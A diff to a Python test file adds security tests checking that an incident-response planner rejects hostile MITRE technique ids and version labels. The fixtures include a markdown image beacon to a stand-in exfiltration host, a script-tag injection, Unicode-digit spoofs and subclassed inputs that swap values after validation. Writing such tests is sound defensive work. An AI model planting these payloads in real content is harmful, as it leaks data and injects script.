@@ -20,6 +20,7 @@ from __future__ import annotations
 import hashlib
 import json
 import os
+from collections.abc import Iterator
 from pathlib import Path
 
 import pytest
@@ -196,3 +197,72 @@ def test_report_states_the_plan_is_not_executed(tmp_path: Path) -> None:
     # Irreversible steps must be flagged before their instructions.
     assert "Irreversible steps requiring explicit approval" in content
     assert "Performed by:" in content
+
+
+@pytest.mark.security
+def test_hostile_technique_ids_and_version_never_reach_a_plan() -> None:
+    """Technique ids and the version label are identifiers, not free text.
+
+    Only the target was bounded; measured before the check, a 355-character
+    "technique id" carrying a heading and an image beacon, and a 225-character
+    version label, both rode into ``to_dict()`` verbatim.
+    """
+    planner = ResponsePlanner()
+    hostile = "# Injected\n![x](https://evil.example/?d=exfil) " + "A" * 300
+    mitre = {
+        "techniques": [{"technique_id": "T1110"}, {"technique_id": hostile}, {"technique_id": 7}],
+        "attack_version": "<script>alert(1)</script>" + "B" * 200,
+    }
+    plan = planner.plan_for_event(mitre, {"indicators": ["203.0.113.5"]})
+    assert plan is not None
+    assert plan.techniques == ("T1110",)
+    assert plan.attack_version == ""
+    rendered = json.dumps(plan.to_dict())
+    assert "evil.example" not in rendered and "<script>" not in rendered
+    with pytest.raises(ValueError, match="technique ids"):
+        planner.plan_for_techniques(["T1110", hostile], ["web-01"])
+
+
+@pytest.mark.security
+def test_non_ascii_digit_technique_ids_never_reach_a_plan() -> None:
+    """``\\d`` admits every Unicode decimal digit: measured before the fix, a
+    fullwidth ``T1486`` (and math-bold, Arabic-Indic, Devanagari ids) reached
+    ``to_dict()`` through both entry points, after a JSON round trip too."""
+    planner = ResponsePlanner()
+    spoofs = [
+        "T\uff11\uff14\uff18\uff16",
+        "T\u0661\u0661\u0661\u0660",
+        "T\U0001d7cf\U0001d7cf\U0001d7cf\U0001d7ce",
+        "T\u0967\u0966\u096b\u096f.\u0966\u0966\u0967",
+    ]
+    mitre = json.loads(
+        json.dumps({"techniques": [{"technique_id": t} for t in ["T1110", *spoofs]]})
+    )
+    plan = planner.plan_for_event(mitre, {"indicators": ["203.0.113.5"]})
+    assert plan is not None and plan.techniques == ("T1110",)
+    for spoof in spoofs:
+        with pytest.raises(ValueError, match="technique ids"):
+            planner.plan_for_techniques(["T1110", spoof], ["web-01"])
+
+
+@pytest.mark.security
+def test_subclassed_inputs_cannot_swap_what_was_checked() -> None:
+    """Measured before the fix: a ``str`` subclass rendered through its own
+    ``__format__``, and a list yielding different items on a second pass put an
+    unchecked heading into ``techniques``."""
+
+    class Rendered(str):
+        def __format__(self, spec: str) -> str:
+            return "# Injected ![x](https://evil.example/)"
+
+    class Flip(list[str]):
+        def __iter__(self) -> Iterator[str]:
+            self.passes = getattr(self, "passes", 0) + 1
+            return iter(["T1110"] if self.passes == 1 else ["T1110", "# Injected"])
+
+    planner = ResponsePlanner()
+    with pytest.raises(ValueError, match="technique ids"):
+        planner.plan_for_techniques([Rendered("T1110")], ["web-01"])
+    with pytest.raises(ValueError, match="attack_version"):
+        planner.plan_for_techniques(["T1110"], ["web-01"], attack_version=Rendered("19.2"))
+    assert planner.plan_for_techniques(Flip(["T1110"]), ["web-01"]).techniques == ("T1110",)
